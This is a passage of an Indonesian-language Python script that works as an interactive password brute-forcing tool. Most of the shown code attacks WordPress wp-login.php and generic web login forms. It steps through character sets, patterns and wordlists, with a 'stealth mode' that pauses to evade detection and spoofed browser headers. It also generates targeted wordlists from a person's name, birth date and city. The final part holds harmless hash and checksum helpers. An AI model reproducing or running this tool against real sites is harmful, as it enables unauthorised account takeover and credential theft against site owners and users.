                    if 'wp-admin' in response.url or 'dashboard' in response.text.lower():
                        end_time = time.time()
                        print(f"\n{Fore.GREEN}[+] Login berhasil!{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Username: {username}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Password: {password}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                        return
                except Exception as e:
                    print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                    continue
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce WordPress dengan pattern
def brute_wp_with_pattern(url, username, pattern):
    print(f"{Fore.BLUE}[*] Memulai bruteforce WordPress dengan pattern...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Pattern: {pattern}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        session = requests.Session()
        
        # Generate semua kombinasi untuk pattern
        question_count = pattern.count('?')
        for replacement in itertools.product(string.printable, repeat=question_count):
            password = pattern
            for c in replacement:
                password = password.replace('?', c, 1)
            
            attempts += 1
            
            if attempts % 10 == 0:
                print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
            
            try:
                # Stealth mode: jeda 3 detik setiap 10 percobaan
                if attempts % 10 == 0:
                    time.sleep(3)
                
                # Data untuk POST request
                login_data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
                    'testcookie': '1'
                }
                
                # Headers untuk menyerupai browser
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Referer': url
                }
                
                response = session.post(url, data=login_data, headers=headers)
                
                # Cek apakah login berhasil
                if 'wp-admin' in response.url or 'dashboard' in response.text.lower():
                    end_time = time.time()
                    print(f"\n{Fore.GREEN}[+] Login berhasil!{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Username: {username}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Password: {password}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                    return
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                continue
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce WordPress dengan wordlist
def brute_wp_with_wordlist(url, username, wordlist_file):
    if not os.path.isfile(wordlist_file):
        print(f"{Fore.RED}[!] File wordlist tidak ditemukan!{Style.RESET_ALL}")
        return
    
    print(f"{Fore.BLUE}[*] Memulai bruteforce WordPress dengan wordlist...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Wordlist: {wordlist_file}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        session = requests.Session()
        
        with open(wordlist_file, 'r', errors='ignore') as wf:
            for line in wf:
                password = line.strip()
                if not password:
                    continue
                
                attempts += 1
                
                if attempts % 10 == 0:
                    print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                
                try:
                    # Stealth mode: jeda 3 detik setiap 10 percobaan
                    if attempts % 10 == 0:
                        time.sleep(3)
                    
                    # Data untuk POST request
                    login_data = {
                        'log': username,
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
                        'testcookie': '1'
                    }
                    
                    # Headers untuk menyerupai browser
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Referer': url
                    }
                    
                    response = session.post(url, data=login_data, headers=headers)
                    
                    # Cek apakah login berhasil
                    if 'wp-admin' in response.url or 'dashboard' in response.text.lower():
                        end_time = time.time()
                        print(f"\n{Fore.GREEN}[+] Login berhasil!{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Username: {username}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Password: {password}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                        return
                except Exception as e:
                    print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                    continue
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce web umum
def bruteforce_general_web():
    print(f"\n{Fore.GREEN}[*] Mode: Bruteforce Login Web Umum{Style.RESET_ALL}")
    url = input(f"{Fore.YELLOW}[?] Masukkan URL login: {Style.RESET_ALL}")
    username = input(f"{Fore.YELLOW}[?] Masukkan username (kosongkan jika tidak diketahui): {Style.RESET_ALL}")
    username_field = input(f"{Fore.YELLOW}[?] Masukkan nama field username (default: username): {Style.RESET_ALL}") or "username"
    password_field = input(f"{Fore.YELLOW}[?] Masukkan nama field password (default: password): {Style.RESET_ALL}") or "password"
    success_indicator = input(f"{Fore.YELLOW}[?] Masukkan teks/tanda login berhasil (misal: Welcome, Dashboard): {Style.RESET_ALL}")
    
    print(f"{Fore.YELLOW}[?] Pilih metode:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} Bruteforce sederhana (a-z, 0-9)")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} Bruteforce dengan pattern")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} Bruteforce dengan wordlist")
    
    method = input(f"{Fore.YELLOW}[?] Pilih metode (1-3): {Style.RESET_ALL}")
    
    if method == "1":
        min_len = int(input(f"{Fore.YELLOW}[?] Panjang minimal password: {Style.RESET_ALL}"))
        max_len = int(input(f"{Fore.YELLOW}[?] Panjang maksimal password: {Style.RESET_ALL}"))
        chars = string.ascii_lowercase + string.digits
        brute_web_with_chars(url, username, username_field, password_field, success_indicator, min_len, max_len, chars)
    elif method == "2":
        pattern = input(f"{Fore.YELLOW}[?] Masukkan pattern (gunakan ? untuk karakter acak): {Style.RESET_ALL}")
        brute_web_with_pattern(url, username, username_field, password_field, success_indicator, pattern)
    elif method == "3":
        wordlist = input(f"{Fore.YELLOW}[?] Masukkan path wordlist: {Style.RESET_ALL}")
        brute_web_with_wordlist(url, username, username_field, password_field, success_indicator, wordlist)
    else:
        print(f"{Fore.RED}[!] Metode tidak valid!{Style.RESET_ALL}")

# Bruteforce web dengan karakter tertentu
def brute_web_with_chars(url, username, username_field, password_field, success_indicator, min_len, max_len, chars):
    print(f"{Fore.BLUE}[*] Memulai bruteforce web...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Karakter yang digunakan: {chars}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        session = requests.Session()
        
        for length in range(min_len, max_len + 1):
            for candidate in itertools.product(chars, repeat=length):
                password = ''.join(candidate)
                attempts += 1
                
                if attempts % 10 == 0:
                    print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                
                try:
                    # Stealth mode: jeda 3 detik setiap 10 percobaan
                    if attempts % 10 == 0:
                        time.sleep(3)
                    
                    # Data untuk POST request
                    login_data = {
                        username_field: username,
                        password_field: password
                    }
                    
                    # Headers untuk menyerupai browser
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Referer': url
                    }
                    
                    response = session.post(url, data=login_data, headers=headers)
                    
                    # Cek apakah login berhasil
                    if success_indicator.lower() in response.text.lower():
                        end_time = time.time()
                        print(f"\n{Fore.GREEN}[+] Login berhasil!{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Username: {username}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Password: {password}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                        return
                except Exception as e:
                    print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                    continue
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce web dengan pattern
def brute_web_with_pattern(url, username, username_field, password_field, success_indicator, pattern):
    print(f"{Fore.BLUE}[*] Memulai bruteforce web dengan pattern...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Pattern: {pattern}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        session = requests.Session()
        
        # Generate semua kombinasi untuk pattern
        question_count = pattern.count('?')
        for replacement in itertools.product(string.printable, repeat=question_count):
            password = pattern
            for c in replacement:
                password = password.replace('?', c, 1)
            
            attempts += 1
            
            if attempts % 10 == 0:
                print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
            
            try:
                # Stealth mode: jeda 3 detik setiap 10 percobaan
                if attempts % 10 == 0:
                    time.sleep(3)
                
                # Data untuk POST request
                login_data = {
                    username_field: username,
                    password_field: password
                }
                
                # Headers untuk menyerupai browser
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Referer': url
                }
                
                response = session.post(url, data=login_data, headers=headers)
                
                # Cek apakah login berhasil
                if success_indicator.lower() in response.text.lower():
                    end_time = time.time()
                    print(f"\n{Fore.GREEN}[+] Login berhasil!{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Username: {username}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Password: {password}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                    return
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                continue
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce web dengan wordlist
def brute_web_with_wordlist(url, username, username_field, password_field, success_indicator, wordlist_file):
    if not os.path.isfile(wordlist_file):
        print(f"{Fore.RED}[!] File wordlist tidak ditemukan!{Style.RESET_ALL}")
        return
    
    print(f"{Fore.BLUE}[*] Memulai bruteforce web dengan wordlist...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Wordlist: {wordlist_file}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        session = requests.Session()
        
        with open(wordlist_file, 'r', errors='ignore') as wf:
            for line in wf:
                password = line.strip()
                if not password:
                    continue
                
                attempts += 1
                
                if attempts % 10 == 0:
                    print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                
                try:
                    # Stealth mode: jeda 3 detik setiap 10 percobaan
                    if attempts % 10 == 0:
                        time.sleep(3)
                    
                    # Data untuk POST request
                    login_data = {
                        username_field: username,
                        password_field: password
                    }
                    
                    # Headers untuk menyerupai browser
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Referer': url
                    }
                    
                    response = session.post(url, data=login_data, headers=headers)
                    
                    # Cek apakah login berhasil
                    if success_indicator.lower() in response.text.lower():
                        end_time = time.time()
                        print(f"\n{Fore.GREEN}[+] Login berhasil!{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Username: {username}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Password: {password}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                        return
                except Exception as e:
                    print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                    continue
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce web dengan wordlist
def bruteforce_web_with_wordlist():
    print(f"\n{Fore.GREEN}[*] Mode: Bruteforce Web dengan Wordlist{Style.RESET_ALL}")
    url = input(f"{Fore.YELLOW}[?] Masukkan URL login: {Style.RESET_ALL}")
    username = input(f"{Fore.YELLOW}[?] Masukkan username (kosongkan jika tidak diketahui): {Style.RESET_ALL}")
    username_field = input(f"{Fore.YELLOW}[?] Masukkan nama field username (default: username): {Style.RESET_ALL}") or "username"
    password_field = input(f"{Fore.YELLOW}[?] Masukkan nama field password (default: password): {Style.RESET_ALL}") or "password"
    success_indicator = input(f"{Fore.YELLOW}[?] Masukkan teks/tanda login berhasil (misal: Welcome, Dashboard): {Style.RESET_ALL}")
    wordlist = input(f"{Fore.YELLOW}[?] Masukkan path wordlist: {Style.RESET_ALL}")
    
    brute_web_with_wordlist(url, username, username_field, password_field, success_indicator, wordlist)

# Menu pembuat wordlist
def wordlist_generator_menu():
    while True:
        show_banner()
        print(f"{Fore.GREEN}[ PEMBUAT WORDLIST ]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} Wordlist berdasarkan karakter")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} Wordlist berdasarkan pattern")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} Wordlist dari informasi pribadi")
        print(f"{Fore.CYAN}4.{Style.RESET_ALL} Wordlist kombinasi")
        print(f"{Fore.CYAN}0.{Style.RESET_ALL} Kembali ke menu utama")
        
        choice = input(f"\n{Fore.YELLOW}[?] Pilih menu: {Style.RESET_ALL}")
        
        if choice == "1":
            wordlist_from_chars()
        elif choice == "2":
            wordlist_from_pattern()
        elif choice == "3":
            wordlist_from_personal_info()
        elif choice == "4":
            wordlist_combination()
        elif choice == "0":
            return
        else:
            print(f"{Fore.RED}[!] Pilihan tidak valid!{Style.RESET_ALL}")
            time.sleep(1)

# Pembuat wordlist dari karakter
def wordlist_from_chars():
    print(f"\n{Fore.GREEN}[*] Mode: Pembuat Wordlist dari Karakter{Style.RESET_ALL}")
    output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output (default: wordlist.txt): {Style.RESET_ALL}") or "wordlist.txt"
    min_len = int(input(f"{Fore.YELLOW}[?] Panjang minimal: {Style.RESET_ALL}"))
    max_len = int(input(f"{Fore.YELLOW}[?] Panjang maksimal: {Style.RESET_ALL}"))
    
    print(f"{Fore.YELLOW}[?] Pilih set karakter:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} Huruf kecil (a-z)")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} Huruf besar (A-Z)")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} Angka (0-9)")
    print(f"{Fore.CYAN}4.{Style.RESET_ALL} Karakter khusus (!@#$%^&*)")
    print(f"{Fore.CYAN}5.{Style.RESET_ALL} Custom")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih set karakter (1-5, pisahkan dengan koma): {Style.RESET_ALL}")
    choices = choice.split(',')
    
    chars = ""
    for c in choices:
        c = c.strip()
        if c == "1":
            chars += string.ascii_lowercase
        elif c == "2":
            chars += string.ascii_uppercase
        elif c == "3":
            chars += string.digits
        elif c == "4":
            chars += "!@#$%^&*()_+-=[]{}|;:,.<>?~"
        elif c == "5":
            custom = input(f"{Fore.YELLOW}[?] Masukkan karakter custom: {Style.RESET_ALL}")
            chars += custom
    
    print(f"{Fore.YELLOW}[*] Karakter yang digunakan: {chars}{Style.RESET_ALL}")
    
    try:
        with open(output_file, 'w') as f:
            total = 0
            for length in range(min_len, max_len + 1):
                for candidate in itertools.product(chars, repeat=length):
                    word = ''.join(candidate)
                    f.write(word + '\n')
                    total += 1
                    
                    if total % 1000 == 0:
                        print(f"{Fore.CYAN}[*] Menulis: {word}... (Total: {total}){Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[+] Wordlist berhasil dibuat!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] File: {output_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Total kata: {total}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal membuat wordlist: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Pembuat wordlist dari pattern
def wordlist_from_pattern():
    print(f"\n{Fore.GREEN}[*] Mode: Pembuat Wordlist dari Pattern{Style.RESET_ALL}")
    output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output (default: wordlist.txt): {Style.RESET_ALL}") or "wordlist.txt"
    pattern = input(f"{Fore.YELLOW}[?] Masukkan pattern (gunakan ? untuk karakter acak): {Style.RESET_ALL}")
    
    print(f"{Fore.YELLOW}[?] Pilih set karakter untuk ?:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} Huruf kecil (a-z)")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} Huruf besar (A-Z)")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} Angka (0-9)")
    print(f"{Fore.CYAN}4.{Style.RESET_ALL} Karakter khusus (!@#$%^&*)")
    print(f"{Fore.CYAN}5.{Style.RESET_ALL} Custom")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih set karakter (1-5, pisahkan dengan koma): {Style.RESET_ALL}")
    choices = choice.split(',')
    
    chars = ""
    for c in choices:
        c = c.strip()
        if c == "1":
            chars += string.ascii_lowercase
        elif c == "2":
            chars += string.ascii_uppercase
        elif c == "3":
            chars += string.digits
        elif c == "4":
            chars += "!@#$%^&*()_+-=[]{}|;:,.<>?~"
        elif c == "5":
            custom = input(f"{Fore.YELLOW}[?] Masukkan karakter custom: {Style.RESET_ALL}")
            chars += custom
    
    print(f"{Fore.YELLOW}[*] Karakter yang digunakan: {chars}{Style.RESET_ALL}")
    
    try:
        with open(output_file, 'w') as f:
            question_count = pattern.count('?')
            total = 0
            
            for replacement in itertools.product(chars, repeat=question_count):
                word = pattern
                for c in replacement:
                    word = word.replace('?', c, 1)
                
                f.write(word + '\n')
                total += 1
                
                if total % 1000 == 0:
                    print(f"{Fore.CYAN}[*] Menulis: {word}... (Total: {total}){Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[+] Wordlist berhasil dibuat!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] File: {output_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Total kata: {total}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal membuat wordlist: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Pembuat wordlist dari informasi pribadi
def wordlist_from_personal_info():
    print(f"\n{Fore.GREEN}[*] Mode: Pembuat Wordlist dari Informasi Pribadi{Style.RESET_ALL}")
    output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output (default: wordlist.txt): {Style.RESET_ALL}") or "wordlist.txt"
    
    print(f"{Fore.YELLOW}[?] Masukkan informasi pribadi (pisahkan dengan koma):{Style.RESET_ALL}")
    info = input(f"{Fore.YELLOW}[*] Nama, tanggal lahir, kota, dll: {Style.RESET_ALL}")
    items = [x.strip() for x in info.split(',')]
    
    print(f"{Fore.YELLOW}[?] Pilih kombinasi:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} Kata saja")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} Kata + angka (0-9)")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} Kata + angka (0-99)")
    print(f"{Fore.CYAN}4.{Style.RESET_ALL} Kata + angka (0-999)")
    print(f"{Fore.CYAN}5.{Style.RESET_ALL} Kata + angka (tahun 1900-2025)")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih kombinasi (1-5): {Style.RESET_ALL}")
    
    try:
        with open(output_file, 'w') as f:
            total = 0
            
            # Tulis kata dasar
            for item in items:
                f.write(item + '\n')
                total += 1
            
            # Kombinasi dengan angka
            if choice in ["2", "3", "4", "5"]:
                for item in items:
                    if choice == "2":
                        # 0-9
                        for i in range(10):
                            f.write(f"{item}{i}\n")
                            f.write(f"{i}{item}\n")
                            f.write(f"{item}_{i}\n")
                            total += 3
                    elif choice == "3":
                        # 0-99
                        for i in range(100):
                            f.write(f"{item}{i}\n")
                            f.write(f"{i}{item}\n")
                            f.write(f"{item}_{i}\n")
                            total += 3
                    elif choice == "4":
                        # 0-999
                        for i in range(1000):
                            f.write(f"{item}{i}\n")
                            f.write(f"{i}{item}\n")
                            f.write(f"{item}_{i}\n")
                            total += 3
                    elif choice == "5":
                        # Tahun 1900-2025
                        for i in range(1900, 2026):
                            f.write(f"{item}{i}\n")
                            f.write(f"{i}{item}\n")
                            f.write(f"{item}_{i}\n")
                            total += 3
            
            # Kombinasi antar kata
            for i in range(len(items)):
                for j in range(len(items)):
                    if i != j:
                        f.write(f"{items[i]}{items[j]}\n")
                        f.write(f"{items[i]}_{items[j]}\n")
                        total += 2
            
            print(f"\n{Fore.GREEN}[+] Wordlist berhasil dibuat!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] File: {output_file}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Total kata: {total}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal membuat wordlist: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Pembuat wordlist kombinasi
def wordlist_combination():
    print(f"\n{Fore.GREEN}[*] Mode: Pembuat Wordlist Kombinasi{Style.RESET_ALL}")
    output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output (default: wordlist.txt): {Style.RESET_ALL}") or "wordlist.txt"
    
    print(f"{Fore.YELLOW}[?] Masukkan sumber wordlist (pisahkan dengan koma):{Style.RESET_ALL}")
    sources = input(f"{Fore.YELLOW}[*] File wordlist atau direktori: {Style.RESET_ALL}")
    sources = [x.strip() for x in sources.split(',')]
    
    wordlists = []
    for source in sources:
        if os.path.isfile(source):
            wordlists.append(source)
        elif os.path.isdir(source):
            for root, _, files in os.walk(source):
                for file in files:
                    wordlists.append(os.path.join(root, file))
    
    if not wordlists:
        print(f"{Fore.RED}[!] Tidak ada wordlist yang valid ditemukan!{Style.RESET_ALL}")
        return
    
    print(f"{Fore.YELLOW}[*] Wordlist yang akan dikombinasikan:{Style.RESET_ALL}")
    for wl in wordlists:
        print(f" - {wl}")
    
    try:
        with open(output_file, 'w') as out:
            total = 0
            
            # Baca semua wordlist ke memory
            words = []
            for wl in wordlists:
                try:
                    with open(wl, 'r', errors='ignore') as f:
                        for line in f:
                            word = line.strip()
                            if word:
                                words.append(word)
                except Exception as e:
                    print(f"{Fore.RED}[!] Gagal membaca {wl}: {str(e)}{Style.RESET_ALL}")
            
            # Buat kombinasi
            for i in range(len(words)):
                for j in range(len(words)):
                    if i != j:
                        out.write(f"{words[i]}{words[j]}\n")
                        out.write(f"{words[i]}_{words[j]}\n")
                        total += 2
                
                if total % 1000 == 0:
                    print(f"{Fore.CYAN}[*] Menulis kombinasi... (Total: {total}){Style.RESET_ALL}")
            
            print(f"\n{Fore.GREEN}[+] Wordlist berhasil dibuat!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] File: {output_file}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Total kata: {total}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal membuat wordlist: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Menu tools tambahan
def additional_tools_menu():
    while True:
        show_banner()
        print(f"{Fore.GREEN}[ TOOLS TAMBAHAN ]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} Hash Generator")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} File Checksum")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} Password Strength Checker")
        print(f"{Fore.CYAN}4.{Style.RESET_ALL} Web Scraper")
        print(f"{Fore.CYAN}0.{Style.RESET_ALL} Kembali ke menu utama")
        
        choice = input(f"\n{Fore.YELLOW}[?] Pilih menu: {Style.RESET_ALL}")
        
        if choice == "1":
            hash_generator()
        elif choice == "2":
            file_checksum()
        elif choice == "3":
            password_strength_checker()
        elif choice == "4":
            web_scraper()
        elif choice == "0":
            return
        else:
            print(f"{Fore.RED}[!] Pilihan tidak valid!{Style.RESET_ALL}")
            time.sleep(1)

# Hash Generator
def hash_generator():
    print(f"\n{Fore.GREEN}[*] Mode: Hash Generator{Style.RESET_ALL}")
    text = input(f"{Fore.YELLOW}[?] Masukkan teks: {Style.RESET_ALL}")
    
    print(f"{Fore.YELLOW}[?] Pilih algoritma hash:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} MD5")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} SHA-1")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} SHA-256")
    print(f"{Fore.CYAN}4.{Style.RESET_ALL} SHA-512")
    print(f"{Fore.CYAN}5.{Style.RESET_ALL} Semua")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih (1-5): {Style.RESET_ALL}")
    
    if choice == "1":
        print(f"\n{Fore.YELLOW}[*] MD5:{Style.RESET_ALL} {hashlib.md5(text.encode()).hexdigest()}")
    elif choice == "2":
        print(f"\n{Fore.YELLOW}[*] SHA-1:{Style.RESET_ALL} {hashlib.sha1(text.encode()).hexdigest()}")
    elif choice == "3":
        print(f"\n{Fore.YELLOW}[*] SHA-256:{Style.RESET_ALL} {hashlib.sha256(text.encode()).hexdigest()}")
    elif choice == "4":
        print(f"\n{Fore.YELLOW}[*] SHA-512:{Style.RESET_ALL} {hashlib.sha512(text.encode()).hexdigest()}")
    elif choice == "5":
        print(f"\n{Fore.YELLOW}[*] MD5:{Style.RESET_ALL} {hashlib.md5(text.encode()).hexdigest()}")
        print(f"{Fore.YELLOW}[*] SHA-1:{Style.RESET_ALL} {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"{Fore.YELLOW}[*] SHA-256:{Style.RESET_ALL} {hashlib.sha256(text.encode()).hexdigest()}")
        print(f"{Fore.YELLOW}[*] SHA-512:{Style.RESET_ALL} {hashlib.sha512(text.encode()).hexdigest()}")
    else:
        print(f"{Fore.RED}[!] Pilihan tidak valid!{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# File Checksum
def file_checksum():
    print(f"\n{Fore.GREEN}[*] Mode: File Checksum{Style.RESET_ALL}")
    file_path = input(f"{Fore.YELLOW}[?] Masukkan path file: {Style.RESET_ALL}")
    
    if not os.path.isfile(file_path):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        time.sleep(1)
        return
    
    print(f"{Fore.YELLOW}[?] Pilih algoritma hash:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} MD5")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} SHA-1")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} SHA-256")
    print(f"{Fore.CYAN}4.{Style.RESET_ALL} SHA-512")
    print(f"{Fore.CYAN}5.{Style.RESET_ALL} Semua")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih (1-5): {Style.RESET_ALL}")
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
            
            if choice == "1":
                print(f"\n{Fore.YELLOW}[*] MD5:{Style.RESET_ALL} {hashlib.md5(data).hexdigest()}")
            elif choice == "2":
                print(f"\n{Fore.YELLOW}[*] SHA-1:{Style.RESET_ALL} {hashlib.sha1(data).hexdigest()}")
            elif choice == "3":
                print(f"\n{Fore.YELLOW}[*] SHA-256:{Style.RESET_ALL} {hashlib.sha256(data).hexdigest()}")
            elif choice == "4":
                print(f"\n{Fore.YELLOW}[*] SHA-512:{Style.RESET_ALL} {hashlib.sha512(data).hexdigest()}")
            elif choice == "5":
                print(f"\n{Fore.YELLOW}[*] MD5:{Style.RESET_ALL} {hashlib.md5(data).hexdigest()}")
